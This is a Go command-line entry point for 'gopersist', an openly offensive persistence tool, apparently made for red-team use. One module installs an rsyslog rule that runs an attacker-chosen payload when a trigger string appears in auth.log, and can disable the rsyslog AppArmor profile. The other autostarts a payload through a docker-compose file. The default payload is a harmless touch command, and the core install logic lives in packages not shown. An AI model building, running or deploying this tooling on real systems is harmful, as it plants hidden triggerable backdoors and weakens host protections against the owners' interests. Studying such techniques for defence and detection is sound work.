package main

import (
	"errors"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/spf13/pflag"

	"gopersist/internal/dockercompose"
	"gopersist/internal/rsyslog"
)

var version = "0.0.0-dev"

func main() {
	root := pflag.NewFlagSet("gopersist", pflag.ContinueOnError)
	root.SortFlags = false
	root.SetOutput(os.Stdout)
	root.SetInterspersed(false)
	root.Usage = func() {
		printMainMenu(root.Output())
	}

	showVersion := root.Bool("version", false, "print version and exit")
	if err := root.Parse(os.Args[1:]); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return
		}
		fmt.Fprintln(os.Stderr, err)
		os.Exit(2)
	}

	if *showVersion {
		fmt.Println("gopersist", version)
		return
	}

	args := root.Args()
	if len(args) == 0 {
		root.Usage()
		return
	}

	module := args[0]
	moduleArgs := args[1:]

	var err error
	switch module {
	case "rsyslog":
		err = runRsyslog(moduleArgs)
	case "docker-compose":
		err = runDockerCompose(moduleArgs)
	case "help":
		root.Usage()
		return
	default:
		err = fmt.Errorf("unknown module %q", module)
	}

	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		fmt.Fprintln(os.Stderr)
		root.Usage()
		os.Exit(1)
	}
}

func runRsyslog(args []string) error {
	fs := pflag.NewFlagSet("gopersist rsyslog", pflag.ContinueOnError)
	fs.SortFlags = false
	fs.Usage = func() {
		fmt.Fprintln(fs.Output(), "Usage: gopersist rsyslog [--check|--install|--remove] [--apparmor] [flags]")
		fmt.Fprintln(fs.Output())
		fmt.Fprintln(fs.Output(), "Flags:")
		fs.PrintDefaults()
	}

	doCheck := fs.Bool("check", false, "check system feasibility and exit")
	doInstall := fs.Bool("install", false, "Installs triggerable rsyslog filter (disables AppArmor profile if required)")
	doRemove := fs.Bool("remove", false, "Removes the gopersist rsyslog drop-in and reloads rsyslog")
	manageAppArmor := fs.Bool("apparmor", false, "manage the rsyslog AppArmor profile (disable on install, re-enable on remove)")
	in := fs.StringP("log-file-in", "l", "/var/log/auth.log", "log file to monitor (imfile)")
	out := fs.StringP("outfile", "o", "", "write rendered config to this file (default stdout)")
	payload := fs.StringP("payload", "p", "/usr/bin/touch /tmp/gopersist", "payload binary to execute (omprog)")
	payloadArgs := fs.String("payload-args", "", "optional arguments for payload binary")
	trigger := fs.StringP("trigger", "t", "uhtavi0", "message substring to trigger on")

	if err := fs.Parse(args); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return nil
		}
		return err
	}

	if fs.NArg() > 0 {
		return fmt.Errorf("unexpected arguments for rsyslog module: %s", strings.Join(fs.Args(), ", "))
	}

	if fs.NFlag() == 0 {
		fs.Usage()
		return nil
	}

	actions := 0
	if *doCheck {
		actions++
	}
	if *doInstall {
		actions++
	}
	if *doRemove {
		actions++
	}
	if actions > 1 {
		return errors.New("choose at most one of --check, --install, or --remove")
	}
	if *manageAppArmor && actions == 0 {
		return errors.New("--apparmor requires --install or --remove")
	}

	if *doCheck {
		res := rsyslog.Check()
		fmt.Print(res.Render())
		return nil
	}

	if *doRemove {
		if *manageAppArmor {
			if err := rsyslog.EnableRsyslogProfile(); err != nil {
				return fmt.Errorf("failed to re-enable AppArmor profile: %w", err)
			}
		}
		msg := "remove complete: /etc/rsyslog.d/99-gopersist.conf removed and rsyslog reloaded"
		if *manageAppArmor {
			msg += "; AppArmor profile re-enabled"
		}
		if err := rsyslog.Remove(); err != nil {
			return fmt.Errorf("remove failed: %w", err)
		}
		fmt.Println(msg)
		return nil
	}

	// Render using PoC defaults
	cfg, err := rsyslog.RenderConfig(rsyslog.ConfigParams{
		InputFile:       *in,
		Tag:             "access",
		Severity:        "info",
		Facility:        "local6",
		AddMetadata:     true,
		PollingInterval: 10,
		FilterByTag:     true,
		FilterContains:  *trigger,
		ProgramPath:     *payload,
		ProgramArgs:     *payloadArgs,
		// Default ruleset is required for isolation and future expansion.
		UseRuleset:  true,
		RulesetName: "gopersist",
	})
	if err != nil {
		return err
	}

	if *doInstall {
		res := rsyslog.Check()
		if *manageAppArmor {
			if err := rsyslog.DisableRsyslogProfile(); err != nil {
				return fmt.Errorf("failed to disable AppArmor profile: %w", err)
			}
		} else if res.RsyslogAppArmorProtected {
			fmt.Fprintln(os.Stderr, "warning: rsyslog AppArmor profile is enforced; run with --apparmor to disable before install")
		}
		if err := rsyslog.Install(cfg); err != nil {
			return fmt.Errorf("install failed: %w", err)
		}
		msg := "install complete: /etc/rsyslog.d/99-gopersist.conf applied and rsyslog reloaded"
		if *manageAppArmor {
			msg += "; AppArmor profile disabled"
		}
		fmt.Println(msg)
		return nil
	}

	if *in == "" || *payload == "" || *trigger == "" {
		return errors.New("rsyslog render requires -l/--log-file-in, -p/--payload, and -t/--trigger")
	}

	if *out == "" {
		fmt.Print(cfg)
		return nil
	}

	if err := os.WriteFile(*out, []byte(cfg), 0644); err != nil {
		return fmt.Errorf("write failed: %w", err)
	}

	return nil
}

func runDockerCompose(args []string) error {
	fs := pflag.NewFlagSet("gopersist docker-compose", pflag.ContinueOnError)
	fs.SortFlags = false
	fs.Usage = func() {
		fmt.Fprintln(fs.Output(), "Usage: gopersist docker-compose [--check|--install|--remove] [flags]")
		fmt.Fprintln(fs.Output())
		fmt.Fprintln(fs.Output(), "Flags:")
		fs.PrintDefaults()
	}

	doCheck := fs.Bool("check", false, "Check for docker privileges and local images available")
	doInstall := fs.Bool("install", false, "create docker-compose.yml, launch with docker compose up")
	doRemove := fs.Bool("remove", false, "stop the docker-compose deployment and delete the compose file")
	payload := fs.StringP("payload", "p", "", "path to payload on HOST filesystem")
	image := fs.StringP("image", "i", "alpine:latest", "container image to launch, will download if required")
	name := fs.StringP("name", "n", "gopersist-compose", "service/container name for docker-compose")
	output := fs.StringP("output", "o", "/opt/gopersist-docker-compose", "directory to place docker-compose.yml")

	if err := fs.Parse(args); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return nil
		}
		return err
	}

	if fs.NArg() > 0 {
		return fmt.Errorf("unexpected arguments for docker-compose module: %s", strings.Join(fs.Args(), ", "))
	}

	actions := 0
	if *doCheck {
		actions++
	}
	if *doInstall {
		actions++
	}
	if *doRemove {
		actions++
	}
	if actions == 0 {
		fs.Usage()
		return nil
	}
	if actions > 1 {
		return errors.New("choose at most one of --check, --install, or --remove")
	}

	if *doCheck {
		res := dockercompose.Check()
		fmt.Print(res.Render())
		return nil
	}

	if *doRemove {
		if strings.TrimSpace(*output) == "" {
			return errors.New("--output directory is required for --remove")
		}
		if err := dockercompose.Remove(*output); err != nil {
			return err
		}
		fmt.Printf("remove complete: docker compose down and %s removed\n", dockercompose.DefaultComposeName)
		return nil
	}

	// Installation path.
	if strings.TrimSpace(*payload) == "" {
		return errors.New("--payload is required for --install")
	}
	if strings.TrimSpace(*image) == "" {
		return errors.New("--image is required for --install")
	}
	if strings.TrimSpace(*name) == "" {
		return errors.New("--name is required for --install")
	}
	if strings.TrimSpace(*output) == "" {
		return errors.New("--output directory is required for --install")
	}

	params := dockercompose.ConfigParams{
		ServiceName:    *name,
		Image:          *image,
		PayloadCommand: *payload,
	}
	cfg, err := dockercompose.RenderConfig(params)
	if err != nil {
		return err
	}

	res := dockercompose.Check()
	if !res.HasAccess() {
		fmt.Fprintln(os.Stderr, "warning: docker commands may fail (insufficient permissions or daemon unavailable)")
	}

	path, err := dockercompose.Install(cfg, *output)
	if err != nil {
		return err
	}

	fmt.Printf("install complete: %s written and docker compose up started (service %s)\n", path, *name)
	return nil
}

func printMainMenu(out io.Writer) {
	const intro = `Usage: gopersist [module] [flags]

Available persistence modules:
  rsyslog          Triggerable rsyslog filter persistence (imfile + omprog)
  docker-compose   Autostart persistence via docker-compose file

Examples:
  gopersist rsyslog --check
  gopersist rsyslog -l /var/log/auth.log -p /usr/local/bin/payload -t trigger
  gopersist docker-compose --check`

	fmt.Fprintln(out, intro)
}
